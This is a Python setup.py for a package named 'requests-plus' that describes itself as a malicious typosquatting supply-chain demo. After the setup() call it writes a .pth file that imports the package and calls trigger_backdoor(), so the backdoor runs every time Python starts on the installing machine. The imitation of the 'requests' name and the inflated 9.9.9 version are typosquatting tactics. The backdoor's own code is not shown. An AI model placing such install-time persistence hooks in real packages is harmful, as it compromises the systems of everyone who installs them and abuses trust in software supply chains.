from setuptools import setup
import os

setup(
    name="requests-plus",
    version="9.9.9",
    packages=["requests_plus"],
    description="Malicious typosquatting package - 2026 supply chain demo",
    install_requires=[],
    python_requires=">=3.8",
)


with open("requests_plus.pth", "w") as f:
    f.write('import requests_plus; requests_plus.trigger_backdoor()')
